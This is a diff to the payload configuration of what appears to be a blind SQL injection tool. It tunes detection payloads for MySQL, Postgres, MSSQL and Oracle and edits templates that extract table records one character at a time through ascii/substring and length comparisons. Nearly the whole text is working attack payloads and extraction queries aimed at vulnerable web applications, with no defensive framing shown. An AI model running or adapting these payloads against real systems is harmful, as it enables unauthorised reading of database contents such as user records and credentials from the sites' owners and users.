@@ -20,23 +20,25 @@ PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
 				  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
 				  #Specific queries
 				  #'&& (select @@version)',
-				  'and (select database())'
-				  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
+				  'and ((select LENGTH(DATABASE()))>1)'
+				  #'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
 				  ],
 	'Postgres':[
-				  'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
+				  "and ascii(substring(version(),1,1))=ascii('P')",
+#				  'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
 				  'and (select current_database())',
 				  #'and (select user)',
-				  'and trunc(random() * cast(random()*1291 as int) - 1)>0',
-				  "and ascii(substring(version(),1,1))=ascii('P')"
-				  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
+				  'and trunc(random() * cast(random()*1291 as int) - 1)>0'
+				  #'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
+
 				],
 	'Mssql':[
 				"and (PI()* SQUARE(rand())) < {0}".format(randint(10,99)),
-				"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
+				#"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
 				"and CONVERT(varchar, SERVERPROPERTY('productversion')) like '%.%'",
-				"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
-				"and (LEN(host_name())>0)"
+				#"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
+				"and (LEN(host_name())>0)",
+				#'and {0}={0}'.format(randint(2,1001)),
 			],
 
 	'Oracle':['and select @@version from dual']
@@ -124,16 +126,15 @@ numRegisters = {
 ####################################################################################################################################################################################
 ####################################  Getting records data ####################################
 RecordQuerys = {
-#"and ascii(substring((select columna from Base.Tabla limit 1 offset {3}),{4},1)) < {5}"
 	'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
-	'Postgres': 'and ascii(substring((select {0} from {1}{2} limit 1 offset {3}),{4},1)) < {5}',
-	'Mssql': "and ascii(substring((select {0} from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only),{4},1)) < {5}",
+	'Postgres': 'and ascii(substring((select {0}::text from {1}{2} limit 1 offset {3}),{4},1)) < {5}',
+	'Mssql': "and ascii(substring((select convert(varchar,{0}) from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only),{4},1)) < {5}",
 	'Oracle': ''
 	}
 
 TamrecordQuery = {
 	'MySQL': 'and (select length((select {0} from {1}.{2} limit 1 offset {3})) < {4})',
-	'Postgres':'and (select length((select {0} from {1}{2} limit 1 offset {3})) < {4})',
+	'Postgres':'and (select length((select {0}::text from {1}{2} limit 1 offset {3})) < {4})',
 	'Mssql':"and len((select {0} from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only)) < {4}",
 	'Oracle':""
 	}
